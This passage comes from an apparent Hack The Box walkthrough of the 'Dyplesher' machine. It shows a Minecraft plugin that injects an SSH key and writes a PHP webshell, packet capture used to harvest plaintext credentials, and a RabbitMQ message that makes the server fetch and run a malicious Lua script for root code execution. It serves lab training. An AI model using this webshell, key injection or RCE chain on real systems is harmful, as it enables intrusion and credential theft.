<p>Next, I will update the .jar file version by editing <code class="language-plaintext highlighter-rouge">pom.xml</code>, Initially it was 1.0-SNAPSHOT, by changing the version detail newly build jar file named <code class="language-plaintext highlighter-rouge">cfx-1.0.jar</code> will be generated. Only reason I am doing this is to ensure the original jar file doesnâ€™t get replaced and I have older version in my archive as well.</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre><span class="nt">&lt;artifactId&gt;</span>cfx<span class="nt">&lt;/artifactId&gt;</span>
    <span class="nt">&lt;version&gt;</span>1.0<span class="nt">&lt;/version&gt;</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Weâ€™ll Add this plugin and then load it again. There is content limit on number of lines held on the console, but we can see the users with their home directories like MinatoTW, felamos &amp; yuntao.</p>

<p>Also, we can the see the current user executing these queries is <code class="language-plaintext highlighter-rouge">MinatoTW</code></p>

<p><img src="/assets/img/Posts/Dyplesher/console1.png" alt="console1" /></p>

<h3 id="shell-access-plugin">Shell access Plugin</h3>

<p>Great! So if we can read files, maybe we can write them too. Having that thought in mind, I decided to inject a SSH key and also upload a PHP backdoor webshell just to be on safer side.</p>

<p>Generating a SSH key:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/dyplesher
â†’ ssh-keygen <span class="nt">-f</span> coldfx
Generating public/private rsa key pair.
Enter passphrase <span class="o">(</span>empty <span class="k">for </span>no passphrase<span class="o">)</span>:
Enter same passphrase again:
Your identification has been saved <span class="k">in </span>coldfx
Your public key has been saved <span class="k">in </span>coldfx.pub
The key fingerprint is:
SHA256:0uJtShyP6MNjord3BqU15/6lpGRQu8vc7XbmloGahfI root@cfx
The key<span class="s1">'s randomart image is:
+---[RSA 3072]----+
|                 |
|                 |
|        .        |
|      +o..       |
|     +=+S  . .   |
|    o+ Oo.. o .  |
|   ...=.Bo.+.  o |
|  o.*.oB.=E+. =  |
|.o.=.=. =.+oo=.  |
+----[SHA256]-----+
</span></pre></td></tr></tbody></table></code></pre></div></div>
<p>Finally Iâ€™ll update the code to Inject our Public SSH key inside <code class="language-plaintext highlighter-rouge">/home/MinatoTW/.ssh/authorized_keys</code> and write a PHP backdoor webshell <code class="language-plaintext highlighter-rouge">cfxshell.php</code> inside <code class="language-plaintext highlighter-rouge">/var/www/test/</code>.</p>

<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre></td><td class="rouge-code"><pre><span class="kn">package</span> <span class="nn">htb.dyplesher.cfx</span><span class="o">;</span>

<span class="kn">import</span> <span class="nn">org.bukkit.plugin.java.JavaPlugin</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.BufferedReader</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.FileReader</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.IOException</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.io.FileWriter</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">fusion</span> <span class="kd">extends</span> <span class="nc">JavaPlugin</span> <span class="o">{</span>
    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onEnable</span><span class="o">()</span> <span class="o">{</span>
        <span class="n">getLogger</span><span class="o">().</span><span class="na">info</span><span class="o">(</span><span class="s">"onEnable is called!"</span><span class="o">);</span>

<span class="c1">//Injecting SSH Key</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="nc">FileWriter</span> <span class="n">file_write</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">FileWriter</span><span class="o">(</span><span class="s">"/home/MinatoTW/.ssh/authorized_keys"</span><span class="o">);</span>
            <span class="n">file_write</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="s">"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDtC3xSsz34olQ4a0fk6x+IqUvSCbsXE6jiM2AMyA8rY+kLoG3ekOTrToramikOd174buxFYF5hpB0jVMN2URAVchcTL1VKpqdm0jssG5nsT69IWMyaOQ8RHb6Ew4pO77y3n1y43DRd1H2HQuZPSZyOpaewROc8F7LPIVXG4h5DMFT0ZL+MYNWD6IuNxBjfrgyz2WVskvXKwSRmq6L6kcwe+1a7XOrwkrpqzoPngtg9T9WP55rXt9Hzm+yDjYFO4VbE2R+L0vCg5UUZOXnjYBniot9w/jZyyOUuqjPG3/vldAtD11t9dbc89ZtOXT7GIzZEjYbCcul3HXhV4JY3SqvAkYB58imYnt8NsLSl2AwTjiIh7VFu6BIHLvNiEjwpMAxkMSj5cXjj2JcCHhGEPRxemRQmC9Wz9PzDEercJJwtQMCAf5vRE+VZnrwIhBHPznQ+7WVQJklI7ywbh9ljc5ZOz0Ba/RAi5AI8w7Lb2QjSP1po21TsBMgNXmhta0F3f+s= root@cfx"</span><span class="o">);</span>
            <span class="n">file_write</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
            <span class="n">getLogger</span><span class="o">().</span><span class="na">info</span><span class="o">(</span><span class="s">"SSH Key Injected Successfully"</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
                <span class="n">getLogger</span><span class="o">().</span><span class="na">info</span><span class="o">(</span><span class="s">"Injection Failed"</span><span class="o">);</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>
<span class="c1">//Writing WebShell</span>
        <span class="k">try</span> <span class="o">{</span>
            <span class="nc">FileWriter</span> <span class="n">file_write</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">FileWriter</span><span class="o">(</span><span class="s">"/var/www/test/cfxshell.php"</span><span class="o">);</span>
            <span class="n">file_write</span><span class="o">.</span><span class="na">write</span><span class="o">(</span><span class="s">"&lt;?php system($_REQUEST['cfx']); ?&gt;"</span><span class="o">);</span>
            <span class="n">file_write</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
            <span class="n">getLogger</span><span class="o">().</span><span class="na">info</span><span class="o">(</span><span class="s">"Written Webshell Successfully"</span><span class="o">);</span>
        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="nc">IOException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">getLogger</span><span class="o">().</span><span class="na">info</span><span class="o">(</span><span class="s">"Couldn't write Webshell"</span><span class="o">);</span>
            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
        <span class="o">}</span>

    <span class="o">}</span>

    <span class="nd">@Override</span>
    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">onDisable</span><span class="o">()</span> <span class="o">{</span>
        <span class="n">getLogger</span><span class="o">().</span><span class="na">info</span><span class="o">(</span><span class="s">"onDisable is called!"</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Changing the version inside pom.xml to 2.0, Run Maven to build the package.</p>

<p><img src="/assets/img/Posts/Dyplesher/intelli.png" alt="intelli" /></p>

<p>Adding and reloading the plugin, we get the output on console:</p>

<p><img src="/assets/img/Posts/Dyplesher/console2.png" alt="console2" /></p>

<p>It appears, We successfully injected SSH key and even wrote a PHP backdoor.</p>

<h3 id="php-backdoor-webshell">PHP Backdoor Webshell</h3>

<p>Testing webshell we discover its working:</p>

<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="go">cfx:  ~/Documents/htb/dyplesher
â†’ curl http://test.dyplesher.htb/cfxshell.php?cfx=id
uid=1001(MinatoTW) gid=1001(MinatoTW) groups=1001(MinatoTW),122(wireshark)
</span></pre></td></tr></tbody></table></code></pre></div></div>

<h3 id="ssh">SSH</h3>

<p>Our Public SSH key is written to the home directory, and we can SSH as MinatoTW :</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/dyplesher
â†’ <span class="nb">chmod </span>600 coldfx

cfx:  ~/Documents/htb/dyplesher
â†’ ssh <span class="nt">-i</span> coldfx MinatoTW@10.10.10.190
Welcome to Ubuntu 19.10 <span class="o">(</span>GNU/Linux 5.3.0-46-generic x86_64<span class="o">)</span>

 <span class="k">*</span> Documentation:  https://help.ubuntu.com
 <span class="k">*</span> Management:     https://landscape.canonical.com
 <span class="k">*</span> Support:        https://ubuntu.com/advantage

  System information as of Tue 27 Oct 2020 05:46:20 PM UTC

  System load:  0.1               Processes:              248
  Usage of /:   6.9% of 97.93GB   Users logged <span class="k">in</span>:        0
  Memory usage: 36%               IP address <span class="k">for </span>ens33:   10.10.10.190
  Swap usage:   0%                IP address <span class="k">for </span>docker0: 172.17.0.1


57 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list <span class="nt">--upgradable</span>


Last login: Wed May 20 13:44:56 2020 from 10.10.14.4
MinatoTW@dyplesher:~<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>MinatoTW<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>MinatoTW<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>MinatoTW<span class="o">)</span>,122<span class="o">(</span>wireshark<span class="o">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="elevating-priv-minatotw---felamos">Elevating Priv: MinatoTW -&gt; felamos</h2>

<h3 id="enumeration">Enumeration</h3>

<p>Inside home directory we find three folders:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>MinatoTW@dyplesher:~<span class="nv">$ </span><span class="nb">ls
</span>backup  Cuberite  paper
</pre></td></tr></tbody></table></code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">backup</code> folder consist of data of memcached service where we find contents of email, username and password discovered earlier.</p>

<p><code class="language-plaintext highlighter-rouge">paper</code> directory contains the some updated data of git bundle we saw in <code class="language-plaintext highlighter-rouge">repo.zip</code></p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre></td><td class="rouge-code"><pre>MinatoTW@dyplesher:~/backup<span class="nv">$ </span><span class="nb">cat </span>backup.sh
<span class="c">#!/bin/bash</span>

memcflush <span class="nt">--servers</span> 127.0.0.1 <span class="nt">--username</span> felamos <span class="nt">--password</span> zxcvbnm
memccp <span class="nt">--servers</span> 127.0.0.1 <span class="nt">--username</span> felamos <span class="nt">--password</span> zxcvbnm /home/MinatoTW/backup/<span class="k">*</span>

MinatoTW@dyplesher:~/paper<span class="nv">$ </span><span class="nb">ls
</span>banned-ips.json      bukkit.yml  commands.yml  help.yml  ops.json   paper.yml        plugins            spigot.yml  usercache.json        whitelist.json
banned-players.json  cache       eula.txt      logs      paper.jar  permissions.yml  server.properties  start.sh    version_history.json  world
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Inside <code class="language-plaintext highlighter-rouge">Cuberite</code> folder we find data related to cuberite server.</p>

<blockquote>
  <p>Cuberite is a Minecraft-compatible multiplayer game server that is written in C++ and designed to be efficient with memory and CPU, as well as having a flexible Lua Plugin API. Cuberite is compatible with the Java Edition Minecraft client.</p>
</blockquote>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>MinatoTW@dyplesher:~/Cuberite<span class="nv">$ </span><span class="nb">ls
</span>BACKERS         buildinfo     Cuberite     helgrind.log  itemblacklist  LICENSE   MojangAPI.sqlite          motd.txt  Ranks.sqlite  start.sh  webadmin          world
banlist.sqlite  CONTRIBUTORS  favicon.png  hg            items.ini      Licenses  MojangAPI.sqlite-journal  Plugins   README.txt    vg        webadmin.ini      world_nether
brewing.txt     crafting.txt  furnace.txt  hg.supp       lang           logs      monsters.ini              Prefabs   settings.ini  vg.supp   whitelist.sqlite  world_the_end
</pre></td></tr></tbody></table></code></pre></div></div>
<h3 id="wireshark-group">Wireshark Group</h3>

<p>Whatâ€™s interesting is that the user MinatoTW is a member of <code class="language-plaintext highlighter-rouge">wireshark</code> group, which is quite unusual:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>MinatoTW@dyplesher:~<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>MinatoTW<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>MinatoTW<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>MinatoTW<span class="o">)</span>,122<span class="o">(</span>wireshark<span class="o">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Looking for files owned by this group, we find <code class="language-plaintext highlighter-rouge">dumpcap</code> is the only file owned by this group:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>MinatoTW@dyplesher:~<span class="nv">$ </span>find / <span class="nt">-group</span> wireshark 2&gt;/dev/null
/usr/bin/dumpcap
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Binary <code class="language-plaintext highlighter-rouge">dumpcap</code> has SUDO capabilities which allows it to capture raw packets:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>MinatoTW@dyplesher:~<span class="nv">$ </span>getcap /usr/bin/dumpcap
/usr/bin/dumpcap <span class="o">=</span> cap_net_admin,cap_net_raw+eip
</pre></td></tr></tbody></table></code></pre></div></div>
<h3 id="packet-capture">Packet Capture</h3>

<p>As there are multiple interfaces on the box, Weâ€™ll first capture data over localhost using loopback interface and store the file inside /dev/shm/:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>MinatoTW@dyplesher:~<span class="nv">$ </span>dumpcap <span class="nt">-i</span> lo <span class="nt">-w</span> /dev/shm/dump.pcapng
Capturing on <span class="s1">'Loopback: lo'</span>
File: /dev/shm/dump.pcapng
Packets captured: 237
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Next, Iâ€™ll make use of <code class="language-plaintext highlighter-rouge">scp</code> to transfer the <code class="language-plaintext highlighter-rouge">pcapng</code> file to my machine for further analysis:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/dyplesher
â†’ scp <span class="nt">-i</span> coldfx MinatoTW@10.10.10.190:/dev/shm/dump.pcapng <span class="nb">.</span>
dump.pcapng                                                                                                                                                 100%   31KB  47.6KB/s   00:00
</pre></td></tr></tbody></table></code></pre></div></div>
<h3 id="pcapng-analysis---wireshark">Pcapng Analysis - Wireshark</h3>

<p>While looking at file packet capture dump, we see lotâ€™s of packets over AMQP (Advanced Message Queuing Protocol), something which was also identified in nmap scan:</p>

<p><img src="/assets/img/Posts/Dyplesher/capture.png" alt="capture" /></p>

<p>Looking at the tcp stream of a packet, we discover additional credentials for users on this box :</p>

<ul>
  <li>MinatoTW:bihys1amFov</li>
  <li>yuntao:wagthAw4ob</li>
  <li>felamos:tieb0graQueg</li>
</ul>

<p><img src="/assets/img/Posts/Dyplesher/capture1.png" alt="capture1" /></p>

<h3 id="ssh---felamos">SSH - felamos</h3>

<p>SSH creds for worked for both MinatoTW and yuntao but thereâ€™s nothing interesting inside yuntaoâ€™s directory.</p>

<p>With felamos creds <code class="language-plaintext highlighter-rouge">felamos:tieb0graQueg</code> we can either SSH or <code class="language-plaintext highlighter-rouge">su</code>:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/dyplesher
â†’ ssh felamos@10.10.10.190
felamos@10.10.10.190<span class="s1">'s password:
Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 27 Oct 2020 06:32:58 PM UTC

  System load:  0.27              Processes:              241
  Usage of /:   6.7% of 97.93GB   Users logged in:        1
  Memory usage: 43%               IP address for ens33:   10.10.10.190
  Swap usage:   0%                IP address for docker0: 172.17.0.1


57 updates can be installed immediately.
0 of these updates are security updates.
To see these additional updates run: apt list --upgradable

Failed to connect to https://changelogs.ubuntu.com/meta-release. Check your Internet connection or proxy settings


Last login: Thu Apr 23 17:33:41 2020 from 192.168.0.103
felamos@dyplesher:~$ id
uid=1000(felamos) gid=1000(felamos) groups=1000(felamos)
</span></pre></td></tr></tbody></table></code></pre></div></div>
<h4 id="usertxt">user.txt</h4>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>felamos@dyplesher:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
bbc5b0e8aab3c8<span class="k">******************</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h2 id="elevating-priv-felamos---root">Elevating Priv: felamos -&gt; root</h2>

<h3 id="enumeration-1">Enumeration</h3>

<p>Inside home directory of felamos, we have a <code class="language-plaintext highlighter-rouge">yuntao</code> directory which is supposedly a note to yuntao.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre></td><td class="rouge-code"><pre>felamos@dyplesher:~/yuntao<span class="nv">$ </span><span class="nb">cat </span>send.sh
<span class="c">#!/bin/bash</span>

<span class="nb">echo</span> <span class="s1">'Hey yuntao, Please publish all cuberite plugins created by players on plugin_data "Exchange" and "Queue". Just send url to download plugins and our new code will review it and working plugins will be added to the server.'</span> <span class="o">&gt;</span>  /dev/pts/<span class="o">{}</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>It appears we need to create a Cuberite plugin, publish the url containing plugin to Exchange &amp; Queue which is RabbitMQ in AMQP.</p>

<h3 id="attack-scenario">Attack Scenario</h3>

<p>One Important thing to note is Cuberite plugins are written in Lua, and we can get code execution in Lua using command like <code class="language-plaintext highlighter-rouge">os.execute</code> which is similar to <code class="language-plaintext highlighter-rouge">os.system</code> like in Python.</p>

<p>Basically, Weâ€™ll publish a message to RabbitMQ and inside the body will be our url to retrieve the cuberite plugin, However instead of a legit cuberite plugin, our url will point towards a malicious Lua script which will give us remote code execution.</p>

<h3 id="amqp-publish-tool">AMQP-Publish tool</h3>

<p>To publish messages to RabbitMQ weâ€™ll use <a href="https://github.com/selency/amqp-publish"><strong>amqp-publish</strong></a> a small written in go used to publish messages to RabbitMQ from command line.</p>

<p>Weâ€™ll download the latest binary from <a href="https://github.com/selency/amqp-publish/releases/tag/v1.0.0"><strong>release</strong></a> and save it to my htb directory.</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/dyplesher
â†’ ./amqp-publish.linux-amd64 <span class="nt">--help</span>
Usage of ./amqp-publish.linux-amd64:
  <span class="nt">-body</span> string
        Message body
  <span class="nt">-exchange</span> string
        Exchange name
  <span class="nt">-routing-key</span> string
        Routing key. Use queue
        name with blank exchange to publish directly to queue.
  <span class="nt">-uri</span> string
        AMQP URI amqp://&lt;user&gt;:&lt;password&gt;@&lt;host&gt;:&lt;port&gt;/[vhost]
</pre></td></tr></tbody></table></code></pre></div></div>
<h4 id="testing-the-tool">Testing the tool</h4>

<p>For understanding toolâ€™s behaviour I tried to first send the command only with felamosâ€™s credential and default body, unfortunately we got a error:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/dyplesher
â†’ ./amqp-publish.linux-amd64 <span class="nt">--uri</span><span class="o">=</span><span class="s2">"amqp://felamos:tieb0graQueg@10.10.10.190:5672/"</span> <span class="nt">--body</span><span class="o">=</span><span class="s2">"hello, world!"</span>
exchange and routing-key cannot both be blank
</pre></td></tr></tbody></table></code></pre></div></div>
<p>It says we need a exchange and routing-key, as mentioned in the note <code class="language-plaintext highlighter-rouge">plugin_data "Exchange" and "Queue"</code> I decided to put <code class="language-plaintext highlighter-rouge">plugin_data</code> in both exchange and routing-key, but again we error on credentials :</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/dyplesher
â†’ ./amqp-publish.linux-amd64 <span class="nt">--uri</span><span class="o">=</span><span class="s2">"amqp://felamos:tieb0graQueg@10.10.10.190:5672/"</span> <span class="nt">--exchange</span><span class="o">=</span><span class="s2">"plugin_data"</span> <span class="nt">--routing-key</span><span class="o">=</span><span class="s2">"plugin_data"</span> <span class="nt">--body</span><span class="o">=</span><span class="s2">"hello, world!"</span>
Exception <span class="o">(</span>403<span class="o">)</span> Reason: <span class="s2">"username or password not allowed"</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>I tried credentials for MinatoTW and yuntao we got earlier but nothing worked.</p>

<h4 id="back-to-wireshark">Back to Wireshark</h4>

<p>I went back to Wireshark dump to check if I missed anything and noticed at the top these messages have been published by <code class="language-plaintext highlighter-rouge">yuntao</code> to RabbitMQ and the password used to authenticate is <code class="language-plaintext highlighter-rouge">EashAnicOc3Op</code></p>

<p><img src="/assets/img/Posts/Dyplesher/capture2.png" alt="capture2" /></p>

<p>We have a new Credential - <code class="language-plaintext highlighter-rouge">yuntao:EashAnicOc3Op</code></p>

<h4 id="amqp-publish-with-new-creds">AMQP-publish with new creds</h4>

<p>Trying with new creds, it appears itâ€™s running successfully as we didnâ€™t receive any error:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/dyplesher
â†’ ./amqp-publish.linux-amd64 <span class="nt">--uri</span><span class="o">=</span><span class="s2">"amqp://yuntao:EashAnicOc3Op@10.10.10.190:5672/"</span> <span class="nt">--exchange</span><span class="o">=</span><span class="s2">"plugin_data"</span> <span class="nt">--routing-key</span><span class="o">=</span><span class="s2">"plugin_data"</span> <span class="nt">--body</span><span class="o">=</span><span class="s2">"hello, world!"</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="rce-test---phase-1">RCE Test - Phase 1</h4>

<p>Now, letâ€™s if we are having any remote code execution by sending a localhost url in the body:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/dyplesher
â†’ ./amqp-publish.linux-amd64 <span class="nt">--uri</span><span class="o">=</span><span class="s2">"amqp://yuntao:EashAnicOc3Op@10.10.10.190:5672/"</span> <span class="nt">--exchange</span><span class="o">=</span><span class="s2">"plugin_data"</span> <span class="nt">--routing-key</span><span class="o">=</span><span class="s2">"plugin_data"</span> <span class="nt">--body</span><span class="o">=</span><span class="s2">"http://127.0.0.1:8020"</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Running a python server with felamos to check if we got any hit:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>felamos@dyplesher:~/yuntao<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 8020
Serving HTTP on 0.0.0.0 port 8020 <span class="o">(</span>http://0.0.0.0:8020/<span class="o">)</span> ...

</pre></td></tr></tbody></table></code></pre></div></div>
<h4 id="rce-test---phase-2">RCE Test - Phase 2</h4>

<p>I was unsure what was happening, so I went back to the tool usage, In 2nd Usage itâ€™s mentioned if we keep exchange as blank, it directly published message to queue using RabbitMQ default exchange. I tried it this way and it worked !!</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/dyplesher
â†’ ./amqp-publish.linux-amd64 <span class="nt">--uri</span><span class="o">=</span><span class="s2">"amqp://yuntao:EashAnicOc3Op@10.10.10.190:5672/"</span> <span class="nt">--exchange</span><span class="o">=</span><span class="s2">""</span> <span class="nt">--routing-key</span><span class="o">=</span><span class="s2">"plugin_data"</span> <span class="nt">--body</span><span class="o">=</span><span class="s2">"http://127.0.0.1:8020"</span>
</pre></td></tr></tbody></table></code></pre></div></div>

<p>Python server hit:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>felamos@dyplesher:~/yuntao<span class="nv">$ </span>python3 <span class="nt">-m</span> http.server 8020
Serving HTTP on 0.0.0.0 port 8020 <span class="o">(</span>http://0.0.0.0:8020/<span class="o">)</span> ...
127.0.0.1 - - <span class="o">[</span>29/Oct/2020 19:34:01] <span class="s2">"GET / HTTP/1.0"</span> 200 -
</pre></td></tr></tbody></table></code></pre></div></div>

<h4 id="confirming-rce">Confirming RCE</h4>

<p>Now, letâ€™s check if we can write anything to the server using this method, I created a Lua script which should create a file named <code class="language-plaintext highlighter-rouge">cfx</code> inside <code class="language-plaintext highlighter-rouge">/tmp/</code></p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>felamos@dyplesher:~/yuntao<span class="nv">$ </span><span class="nb">cat </span>test.lua
os.execute<span class="o">(</span><span class="s2">"touch /tmp/cfx"</span><span class="o">)</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Sending the command from my machine:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>cfx:  ~/Documents/htb/dyplesher
â†’ ./amqp-publish.linux-amd64 <span class="nt">--uri</span><span class="o">=</span><span class="s2">"amqp://yuntao:EashAnicOc3Op@10.10.10.190:5672/"</span> <span class="nt">--exchange</span><span class="o">=</span><span class="s2">""</span> <span class="nt">--routing-key</span><span class="o">=</span><span class="s2">"plugin_data"</span> <span class="nt">--body</span><span class="o">=</span><span class="s2">"http://127.0.0.1:8020/test.lua"</span>
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Getting the hit on Python server:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre>felamos@dyplesher:~/yuntao$ python3 -m http.server 8020
Serving HTTP on 0.0.0.0 port 8020 (http://0.0.0.0:8020/) ...
127.0.0.1 - - [29/Oct/2020 19:40:41] "GET /test.lua HTTP/1.0" 200 -
</pre></td></tr></tbody></table></code></pre></div></div>
<p>Success !! File getâ€™s created inside <code class="language-plaintext highlighter-rouge">/tmp/</code> owned by root:</p>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
